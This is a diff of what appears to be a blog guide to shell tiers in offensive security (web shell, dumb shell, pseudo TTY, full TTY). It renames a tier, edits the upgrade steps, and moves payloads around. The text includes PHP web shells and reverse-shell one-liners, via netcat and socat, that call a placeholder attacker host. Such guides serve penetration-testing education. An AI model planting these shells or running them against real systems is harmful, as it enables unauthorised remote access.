@@ -1,7 +1,7 @@
 ---
 title: Shells, TTY, and SSH - A Practical Guide for Offensive Security
 date: 2026-03-14
-lastmod: 2026-03-14
+lastmod: 2026-07-24
 description: A technical guide covering shell interactivity tiers in offensive security - web shell, dumb shell, pseudo TTY, and upgraded TTY - including payloads, upgrade techniques, and a practical comparison of in-place TTY upgrade versus pivoting to SSH.
 summary: This post breaks down every tier of shell quality, how to upgrade, and when it makes sense to just SSH in instead (along with the real trade-offs of doing so).
 tags:
@@ -42,22 +42,22 @@ A dumb shell is a raw reverse or bind shell established over a TCP connection (`
 
 By spawning a pseudo-terminal inside the existing shell, we get signal handling and basic interactivity back. `Ctrl+C` now sends `SIGINT` to the foreground process instead of killing the connection. Basic text editors start working. However, tab completion and arrow keys still don't function properly because the local terminal is not yet in **raw mode**.
 
-### Tier 1 - Upgraded TTY
+### Tier 1 - Full TTY
 
 A fully upgraded TTY puts the local terminal into raw mode (`stty raw -echo`), which passes all keystrokes - including `Ctrl+C`, arrow keys, and `Tab` - directly through to the remote PTY. This is functionally equivalent to a native terminal session. Everything works: `vim`, `sudo`, tab completion, command history, and interactive programs like `top`.
 
 ### Comparison at a Glance
 
-| Feature         | Web shell | Dumb shell | Pseudo TTY | Upgraded TTY |
-| --------------- | --------- | ---------- | ---------- | ------------ |
-| TTY             | ✗         | ✗          | partial    | ✓            |
-| Ctrl+C safe     | ✗         | ✗          | ✓          | ✓            |
-| Tab completion  | ✗         | ✗          | ✗          | ✓            |
-| Text editors    | ✗         | ✗          | partial    | ✓            |
-| Signal handling | ✗         | ✗          | ✓          | ✓            |
-| Encryption      | ✗         | ✗          | ✗          | ✗            |
-| Stability       | low       | low        | medium     | medium       |
-| Persistence     | ✓ (file)  | ✗          | ✗          | ✗            |
+| Feature         | Web shell | Dumb shell | Pseudo TTY | Full TTY |
+| --------------- | --------- | ---------- | ---------- | -------- |
+| TTY             | ✗         | ✗          | partial    | ✓        |
+| Ctrl+C safe     | ✗         | ✗          | ✓          | ✓        |
+| Tab completion  | ✗         | ✗          | ✗          | ✓        |
+| Text editors    | ✗         | ✗          | partial    | ✓        |
+| Signal handling | ✗         | ✗          | ✓          | ✓        |
+| Encryption      | ✗         | ✗          | ✗          | ✗        |
+| Stability       | low       | low        | medium     | medium   |
+| Persistence     | ✓ (file)  | ✗          | ✗          | ✗        |
 
 ---
 
@@ -74,14 +74,12 @@ A fully upgraded TTY puts the local terminal into raw mode (`stty raw -echo`), w
 **Common payloads:**
 
 ```php
-<!-- PHP - minimal -->
+<!-- Minimal shell -->
 <?php system($_GET['cmd']); ?>
 
-<!-- PHP - with output buffering -->
-<?php echo shell_exec($_REQUEST['cmd']); ?>
 
-<!-- PHP - reverse shell -->
-<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f"); ?>
+<!-- Shell with output buffering -->
+<?php echo shell_exec($_REQUEST['cmd']); ?>
 ```
 
 **Upgrade path:** Use the web shell to execute a reverse shell one-liner, transitioning to a _dumb shell_.
@@ -97,6 +95,11 @@ A fully upgraded TTY puts the local terminal into raw mode (`stty raw -echo`), w
 **Limitations:** _Fragile_ - `Ctrl+C` kills the session. No tab completion, no text editors, no job control. Traffic is plaintext over raw TCP (easily flagged by network monitoring).
 
 **Common payloads:**
+
+```php
+# Upload PHP to get netcat reverse shell (listen with nc -lvnp ATTACKER_PORT)
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f"); ?>
+```
 
 ```bash
 # Bash - /dev/tcp
@@ -160,11 +163,11 @@ socat file:`tty`,raw,echo=0 tcp-listen:ATTACKER_PORT
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:ATTACKER_PORT
 ```
 
-**Upgrade path:** Proceed to the full TTY upgrade sequence.
+**Upgrade path:** Proceed to the Full TTY upgrade sequence.
 
 ---
 
-### Upgraded TTY
+### Full TTY
 
 **What it is:** A fully interactive terminal session achieved by combining a _PTY_ on the target with _raw mode_ on the attacker's local terminal.
 
@@ -175,22 +178,19 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:ATTACKER_POR
 **Full upgrade sequence:**
 
 ```bash
-# Step 1 - On target: spawn a PTY (to get Tier 2)
+# Step 1 - Spawn a PTY (to get to Tier 2 first)
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
-# Step 2 - Background the shell with Ctrl+Z
-## Then on attacker local terminal:
+# Step 2 - Background the shell with Ctrl+Z, then run these commands
+# (the formatting will look messy for a moment, but stick with it)
 stty raw -echo; fg
-## Press Enter to go back on target shell:
-reset
 
-# Step 3 - On target: fix terminal environment
+# Step 3 - Fix the terminal environment
 export TERM=xterm-256color
 export SHELL=/bin/bash
 
-# Step 4 - Match terminal dimensions
-# Check your local terminal first: stty size
-stty rows 50 cols 220   # adjust to your terminal dimensions
+# Step 4 - Match terminal dimensions if they don't already match
+stty rows 50 cols 220   # adjust to your terminal's actual dimensions
 ```
 
 ---
